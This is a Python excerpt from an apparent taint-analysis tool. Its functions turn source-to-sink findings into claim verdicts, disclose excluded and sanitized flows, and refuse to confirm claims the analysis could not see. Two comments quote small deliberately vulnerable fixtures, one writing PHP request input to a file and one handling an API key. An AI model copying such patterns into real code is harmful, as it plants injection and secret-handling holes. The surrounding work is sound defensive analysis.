        ClaimVerdict with the result. ``excluded_flows`` reports what the
        production default set aside, on both the confirmed and violated paths.
    """
    tf = claim.constraint_taint_flow
    if tf is None:
        # ADR-0033 Phase 3 PR4 / WI-rolol sub-task A: silent-confirm
        # fall-through. Previously returned verdict="confirmed" with
        # details="No taint_flow constraint to check.", which silently
        # confirms claims that have no taint_flow machinery to verify
        # them.
        return ClaimVerdict(
            claim_id=claim.id,
            claim_text=claim.text,
            verdict="inconclusive",
            details=(
                "No taint_flow constraint on this claim. "
                "verify_taint_claim cannot assert anything."
            ),
        )

    # Filter findings matching this claim's taint label and sink zone.
    #
    # ``and not f.sanitized`` was a TAUTOLOGY until the propagators started
    # emitting sanitized flows: the field was written ``False`` at both and
    # only construction sites, so this clause removed nothing and the
    # ``confirmed_safe`` branch of ``TaintFlowFinding.verdict`` was unreachable
    # in production. It now filters for real — and what it filters is counted
    # and disclosed rather than silently dropped, because "no path exists" and
    # "a path exists and your encrypt() call is what makes it safe" are
    # different facts, and only the second tells a reader what breaks if they
    # remove that call.
    constrained = [
        f for f in findings
        if f.taint_label == tf.source_taint
        and f.sink_zone == tf.prohibited_sink_zone
    ]
    matching = [f for f in constrained if not f.sanitized]
    sanitized_flows = len(constrained) - len(matching)

    # WI-bifob: production is the default scope, and what the default leaves
    # out is DISCLOSED rather than dropped. A test that opens a listener is not
    # a network-exposure finding about the product, and a migration that writes
    # to the database is not an untrusted-input finding — yet because a claim
    # verdict is a DISJUNCTION over its flows, a single such flow was enough to
    # hold a whole claim at `violated` forever, and no amount of precision work
    # elsewhere could move it. Measured on the 9-repo cohort: 2 of 18 violated
    # claims rested entirely on one test-sourced flow each (a conftest.py
    # reading an env var, a _test.go dialling TLS).
    #
    # Nobody ever decided taint should count test code; it simply was never
    # wired, which is the tell that this was an unmade decision rather than a
    # considered scope.
    excluded_flows: dict[str, int] = {}
    if include_non_production:
        violations = matching
    else:
        violations = []
        for finding in matching:
            scope = _source_scope(finding)
            if scope == SOURCE_SCOPE_PRODUCTION:
                violations.append(finding)
            else:
                excluded_flows[scope] = excluded_flows.get(scope, 0) + 1

    if not violations:
        excluded_clause = ""
        if excluded_flows:
            # State the exclusions on the CONFIRMED path especially. This is
            # where a silent filter would be most misleading: the claim reads
            # as clean, and the reader has no way to learn that flows existed
            # and were set aside by a policy they did not choose.
            parts = ", ".join(
                f"{count} {reason}"
                for reason, count in sorted(excluded_flows.items())
            )
            excluded_clause = (
                f" Excluded from this verdict as non-production: {parts} "
                f"(pass --include-non-production-sources to count them)."
            )
        # The confirmed path is where a sanitized flow matters MOST: the claim
        # reads clean, and the reason it reads clean may be a sanitizer the
        # reader is one refactor away from removing. Saying so turns "no
        # violation" into "no violation, and here is what is holding it".
        sanitized_clause = ""
        if sanitized_flows:
            sanitized_clause = (
                f" {sanitized_flows} flow(s) reach that zone but pass through "
                f"a sanitizer on every route"
                f"{_sanitizer_attribution(constrained)}."
            )
        # INV-pojib (b)/(c). Remedy (a1) put the repo-supplied sanitizer into
        # the sentence above; this puts it into the VERDICT VALUE, which is
        # what the exit code and every programmatic consumer read. Measured on
        # the shipped CLI before this landed: the fixture whose whole content
        # is `os.remove(launder(os.environ["API_KEY"]))` went `violated` rc 1 ->
        # `confirmed` rc 0 on the strength of an 8-line file the repository
        # supplied about itself, and rc 0 there was byte-identical to rc 0 on a
        # verdict the analysis earned unaided.
        #
        # RAISED ONLY WHERE IT DISCRIMINATES. A caveat on every sanitized
        # verdict would carry no information and a reader would learn to
        # discount it — that is remedy (a2), rejected on this item for exactly
        # that reason, and shipping it as a verdict VALUE would be the same
        # mistake with a wider blast radius. The shipped-catalogue case stays
        # plain `confirmed`, pinned by
        # `test_a_built_in_sanitizer_still_earns_a_plain_confirmed`.
        _, repo_supplied = _credited_sanitizers(constrained)
        caveats: list[dict[str, Any]] = []
        # INV-faput. Sits beside the sanitizer caveat because it is the same
        # question one layer earlier: did the repository's own catalogue, not
        # the analysis, produce this clean verdict? The sanitizer case can be
        # attributed on the flow; this one cannot, because the displaced sink
        # left the catalogue before any flow was built.
        displaced = _displaced_shipped_entries(
            tf, displaced_sinks, displaced_sources,
        )
        if displaced:
            shown = ", ".join(displaced)
            caveats = _merge_caveat(caveats, {
                "kind": CAVEAT_DISPLACED_SHIPPED_ENTRY,
                "entries": displaced,
                "detail": (
                    f"This verdict is clean, but the analysed repository "
                    f"replaced {len(displaced)} catalogue entr(y/ies) that "
                    f"hypergumbo ships and that bear directly on this claim: "
                    f"{shown}. A replacement does not add to the catalogue — "
                    f"it removes the shipped entry, so any flow it would have "
                    f"caught was never constructed and cannot appear as a "
                    f"sanitized or excluded flow. The tool cannot check that "
                    f"the repository's replacement is equivalent."
                ),
            })
        if repo_supplied:
            shown = ", ".join(sorted(repo_supplied))
            caveats.append({
                "kind": CAVEAT_USER_SUPPLIED_SANITIZER,
                "entries": sorted(repo_supplied),
                "detail": (
                    f"A sanitizer supplied by the analysed repository is "
                    f"credited with removing {sanitized_flows} flow(s) that "
                    f"would otherwise have been reported: {shown}. The tool "
                    f"cannot check that the named function neutralises the "
                    f"taint; it takes the repository's word for it."
                ),
            })
        # INV-nuhun. LAST, and only on this path. A ``violated`` verdict never
        # reaches here, which is the whole discipline of this module: finding
        # evidence is trustworthy regardless of what went unadjudicated, and
        # coverage gates the ALL-CLEAR and nothing else.
        #
        # SCOPED BY THE CLAIM'S OWN SINK ZONE, the taint vocabulary's equivalent
        # of the boundary scoping that made this shippable in the other arm: an
        # unrelated dict ``.get``, catalogued as a ``database`` sink, cannot
        # touch a ``network`` verdict.
        if coverage is not None:
            zone_sites = coverage.untyped_receiver_zones.get(
                tf.prohibited_sink_zone,
            ) or []
            if zone_sites:
                caveats = _merge_caveat(caveats, _untyped_receiver_caveat(
                    tf.prohibited_sink_zone, zone_sites, arm=_ARM_TAINT,
                ))
            # The UNSCOPED half, unchanged from the boundary arm and reusing its
            # already-computed numbers rather than recounting. Reuse is the
            # point: one invocation printing two different "N of M method call
            # sites" figures for one repository would be a new asymmetry
            # introduced by the fix for an asymmetry.
            _scope_sites, _scope_total, _scope_names = (
                coverage.unknown_receiver_scope
            )
            if _scope_sites:
                caveats = _merge_caveat(
                    caveats,
                    _unknown_receiver_scope_caveat(
                        _scope_sites, _scope_total, _scope_names,
                    ),
                )
            # The declared-blindness disclosure rides BOTH arms for the reason
            # INV-nuhun exists: a run that discloses on the boundary arm and
            # stays silent on the taint arm about the same unseen call is the
            # asymmetry that item names.
            if coverage.method_call_blind_languages:
                caveats = _merge_caveat(
                    caveats,
                    _analyzer_method_call_blind_caveat(
                        coverage.method_call_blind_languages,
                    ),
                )
            if coverage.suppressed_sink_methods:
                caveats = _merge_caveat(
                    caveats,
                    _analyzer_suppressed_methods_caveat(
                        coverage.suppressed_sink_methods,
                    ),
                )
            if coverage.higher_fidelity_available:
                caveats = _merge_caveat(
                    caveats,
                    _higher_fidelity_caveat(
                        coverage.higher_fidelity_available,
                    ),
                )
        return ClaimVerdict(
            claim_id=claim.id,
            claim_text=claim.text,
            verdict=(
                "confirmed_with_caveats" if caveats else "confirmed"
            ),
            details=(
                f"No unsanitized {tf.source_taint} data reaches "
                f"{tf.prohibited_sink_zone} zone."
                f"{sanitized_clause}{excluded_clause}"
            ),
            excluded_flows=excluded_flows,
            sanitized_flows=sanitized_flows,
            caveats=caveats,
        )

    # Build detailed violation message with per-flow drill-down evidence
    # (WI-kikis). The previous rendering collapsed every violation to a bare
    # "<source_primitive> -> <sink_primitive>" pair and showed the first 5 —
    # which, on high-count claims (3,969 flows on the self-corpus), were
    # frequently VERBATIM DUPLICATES, because many distinct source/sink SYMBOLS
    # share a primitive NAME. The consumer saw the same string five times and
    # had no way to locate any individual flow (no symbol, no path, no edge).
    # Fix: (a) deduplicate on the full per-flow identity (source/sink symbol +
    # primitive + call-graph path) so genuinely-identical findings collapse and
    # the shown rows are DISTINCT; (b) render each shown row WITH its symbol IDs
    # (and path-hop count) so distinct flows are visibly distinct and drillable;
    # (c) attach the bounded structured ``evidence`` list to the verdict so a
    # consumer can triage programmatically even at high evidence counts.
    distinct_violations: list["TaintFlowFinding"] = []
    _seen_flows: set[tuple[Any, ...]] = set()
    for v in violations:
        identity = _flow_identity(v)
        if identity in _seen_flows:
            continue
        _seen_flows.add(identity)
        distinct_violations.append(v)

    # INV-karud: the situation count REPLACED the pair count as the headline
    # number, so the pair count is disclosed rather than dropped. A reader who
    # wants "how many source->sink pairs" would otherwise have to sum
    # `collapsed_flow_count` across the evidence rows — and the evidence list
    # is capped, so that sum would be wrong above _MAX_EVIDENCE_ROWS.
    pair_total = sum(v.collapsed_flow_count for v in violations)
    pair_clause = ""
    if pair_total > len(violations):
        pair_clause = f" spanning {pair_total} source->sink pair(s)"

    paths_desc = "; ".join(_render_flow(v) for v in distinct_violations[:5])
    suffix = ""
    if len(distinct_violations) > 5:
        suffix = (
            f" (and {len(distinct_violations) - 5} more distinct flow(s))"
        )
    # Only disclose the distinct count when it differs from the raw total, so
    # the common no-duplicates case stays terse.
    distinct_clause = ""
    if len(distinct_violations) < len(violations):
        distinct_clause = f" ({len(distinct_violations)} distinct)"

    # WI-vazal: report WHICH boundary each counted flow entered through.
    # The label cannot carry it — three boundaries share `untrusted_input`.
    flow_origins: dict[str, int] = {}
    for finding in violations:
        origin = getattr(finding, "source_boundary", "") or "declared"
        flow_origins[origin] = flow_origins.get(origin, 0) + 1

    # INV-karud (c): report HOW each counted flow was adjudicated.
    #
    # Both breakdowns count `violations` — every flow the verdict rests on —
    # NOT `distinct_violations[:_MAX_EVIDENCE_ROWS]`. The shown rows are
    # deduplicated and capped, so a breakdown over them would silently
    # disagree with the `len(violations)` count printed beside it in `details`.
    analysis_methods: dict[str, int] = {}
    confidences: dict[str, int] = {}
    for finding in violations:
        method = getattr(finding, "analysis_method", "") or "structural"
        analysis_methods[method] = analysis_methods.get(method, 0) + 1
        conf = getattr(finding, "confidence", "") or "approximate"
        confidences[conf] = confidences.get(conf, 0) + 1

    # AGGREGATION POLICY, stated rather than left to `max()`. A verdict is a
    # DISJUNCTION over its flows, and after ADR-0017 §3a those flows can be
    # adjudicated differently — some by a data-dependence walk, some by call
    # reachability alone. Collapsing upward would claim a precision most flows
    # did not have; collapsing downward would erase the ones that earned it.
    # So the composition is reported. The single-value case stays terse (the
    # same shape as `distinct_clause` above), which keeps today's rendering
    # byte-identical for a verdict whose flows all agree — and today they
    # nearly all do, which is exactly why the hardcoded literal went unnoticed.
    if len(confidences) == 1:
        confidence_clause = next(iter(confidences))
    else:
        confidence_clause = ", ".join(
            f"{count} {name}" for name, count in sorted(confidences.items())
        )

    # WI-bifob's own stated contract is that exclusions are disclosed "on the
    # CONFIRMED path as well as the violated one". Only the confirmed path
    # implemented it: on the violated path `excluded_flows` was attached to the
    # dataclass and never rendered, and `cli.py` prints `details` alone — so a
    # TEXT-mode reader of a violated claim never learned that flows were set
    # aside by a policy they did not choose. `flow_origins` (WI-vazal) reached
    # no text surface at all, on either path, which mattered most exactly where
    # it was measured: all 140 flows on pretix's largest violated claim are
    # database-read-to-database-write, and that is decision-changing.
    #
    # Both are spliced into `details` rather than rendered by the CLI, because
    # `details` is where this module already puts the confirmed-path exclusion
    # clause — one home for the prose, not two.
    origins_clause = ", ".join(
        f"{count} {name}" for name, count in sorted(flow_origins.items())
    )
    excluded_clause = ""
    if excluded_flows:
        parts = ", ".join(
            f"{count} {reason}"
            for reason, count in sorted(excluded_flows.items())
        )
        excluded_clause = (
            f" Excluded from this verdict as non-production: {parts} "
            f"(pass --include-non-production-sources to count them)."
        )

    return ClaimVerdict(
        claim_id=claim.id,
        claim_text=claim.text,
        verdict="violated",
        evidence_count=len(violations),
        evidence=[
            _flow_evidence_dict(v)
            for v in distinct_violations[:_MAX_EVIDENCE_ROWS]
        ],
        details=(
            f"{len(violations)} unsanitized {tf.source_taint} flow(s)"
            f"{distinct_clause}{pair_clause} "
            f"to {tf.prohibited_sink_zone} zone "
            f"[{tf.source_taint} confidence: {confidence_clause}] "
            f"[origins: {origins_clause}]: "
            f"{paths_desc}{suffix}{excluded_clause}"
        ),
        excluded_flows=excluded_flows,
        flow_origins=flow_origins,
        analysis_methods=analysis_methods,
        sanitized_flows=sanitized_flows,
    )


def _require_coverage_to_confirm(
    verdict: ClaimVerdict,
    blind_reason: str | None,
    opaque_sites: list[str] | None = None,
) -> ClaimVerdict:
    """Downgrade a ``confirmed`` verdict the analysis did not earn.

    ONE RULE, ONE PLACE, applied to every constraint kind on the way out of
    :func:`verify_claims`: *a claim may only be confirmed if the analysis
    could actually look*. A ``violated`` verdict is untouched — finding
    something is trustworthy regardless of coverage; it is the CLEAN result
    that depends on having looked.

    THE DEFECT THIS CLOSES, measured on real input rather than reasoned
    about: a PHP file doing ``file_put_contents("/tmp/out", $_GET['payload'])``
    returned ``confirmed`` at exit 0 for the claim "untrusted input must not
    reach the filesystem", because PHP has no taint catalogue and "no flows
    found" was reported as "no flows exist". The boundary constraint kinds
    already refused to confirm a blind analysis (WI-kajil / INV-bitig); taint
    claims skipped the same rule and a stderr note asked the READER to apply
    it by hand — "Treat 'confirmed' verdicts on these languages as
    inconclusive" — which no CI gate and no hurried human does.

    This is a backstop, not the only check. ``verify_claim`` keeps its own
    per-kind coverage tests because they produce a better-worded reason; this
    catches any constraint kind that has none, including kinds added later.
    ``test_every_constraint_kind_is_coverage_gated`` enumerates them.
    """
    # CONFIRMING_VERDICTS, not ``== "confirmed"``. Blindness DOMINATES a
    # caveat: "the analysis could not look" is a strictly worse state than
    # "the analysis looked and leaned on an unverifiable input", so a caveated
    # verdict must fall all the way to ``inconclusive`` rather than surviving
    # as a qualified pass. Testing the literal here is how adding INV-pojib's
    # fourth verdict value would have punched a hole through this gate.
    if verdict.verdict not in CONFIRMING_VERDICTS or not blind_reason:
        return verdict
    # ADR-0016 §4, owner-authorized 2026-08-13. When the incompleteness is
    # NAMED OPAQUE LAUNCH SITES and nothing else, the honest verdict is a
    # QUALIFIED one rather than a withheld one — the caller passes
    # ``opaque_sites`` only when ``BoundaryCoverage.qualifying_only`` held, so
    # the sole-blocker test is not re-derived here.
    #
    # THE CAVEAT IS APPENDED, NEVER ASSIGNED. A taint verdict can already
    # carry INV-pojib's user_supplied_sanitizer kind, and the self-proof is
    # exactly that case — it declares a zone-barrier sanitizer AND shells out
    # to git. Overwriting would be the one-slot last-writer-wins class
    # (INV-virat) reappearing inside the caveat list itself.
    if opaque_sites:
        return ClaimVerdict(
            claim_id=verdict.claim_id,
            claim_text=verdict.claim_text,
            verdict="confirmed_with_caveats",
            evidence=verdict.evidence,
            evidence_count=verdict.evidence_count,
            details=verdict.details,
            excluded_flows=verdict.excluded_flows,
            flow_origins=verdict.flow_origins,
            analysis_methods=verdict.analysis_methods,
            sanitized_flows=verdict.sanitized_flows,
            caveats=_merge_caveat(
                verdict.caveats, _opaque_boundary_caveat(opaque_sites),
            ),
        )
    return ClaimVerdict(
        claim_id=verdict.claim_id,
        claim_text=verdict.claim_text,
        verdict="inconclusive",
        evidence=verdict.evidence,
        evidence_count=verdict.evidence_count,
        details=(
            f"{verdict.details} NOT CONFIRMED: {blind_reason}. Absence of "
            f"evidence here is not evidence of absence."
        ),
    )


def verify_claims(
    claims: list[Claim],
    boundary_map: BoundaryMap,
    taint_findings: list | None = None,
    coverage: Optional[BoundaryCoverage] = None,
    include_non_production: bool = False,
    blind_reason: str | None = None,
    blind_opaque_sites: list[str] | None = None,
    displaced_sinks: Mapping[str, Sequence[Any]] | None = None,
    displaced_sources: Mapping[str, Sequence[Any]] | None = None,
) -> list[ClaimVerdict]:
    """Verify all claims against boundary map and/or taint-flow findings.

    Claims with ``constraint_taint_flow`` are verified against taint findings.
    Claims with boundary constraints are verified against the boundary map.

    Args:
        claims: List of claims to verify.
        boundary_map: The I/O boundary map to check against.
        taint_findings: Optional list of TaintFlowFinding objects.
        coverage: Boundary-analysis coverage signal, passed to BOTH arms.
            Boundary claims consume it as WI-kajil intended; taint claims read
            only its untyped-receiver disclosures (INV-nuhun) and keep their own
            unsupported-language signal (INV-javam) for the blindness question.
            This said "taint claims ... are unaffected" until INV-nuhun measured
            what that cost: the same untyped receiver was disclosed by name on a
            boundary verdict and passed over in silence on a taint verdict in
            ONE invocation, and the silent one carried the tick.
        include_non_production: Count test/fixture/migration-sourced taint
            flows against taint claims (WI-bifob). Default False; excluded
            flows are disclosed per-verdict in ``excluded_flows``. Boundary
            claims are unaffected.

    Returns:
        List of ClaimVerdict objects, one per claim.
    """
    verdicts: list[ClaimVerdict] = []
    for claim in claims:
        if claim.constraint_taint_flow is not None:
            verdict = verify_taint_claim(
                claim, taint_findings or [],
                include_non_production=include_non_production,
                displaced_sinks=displaced_sinks,
                displaced_sources=displaced_sources,
                coverage=coverage,
            )
        else:
            verdict = verify_claim(claim, boundary_map, coverage=coverage)
        # Single coverage gate for EVERY constraint kind — see
        # _require_coverage_to_confirm. Applied here rather than at each
        # branch so a constraint kind added later cannot ship unable to
        # distinguish "looked and found nothing" from "did not look".
        verdicts.append(
            _require_coverage_to_confirm(
                verdict, blind_reason, blind_opaque_sites,
            ),
        )
    return verdicts
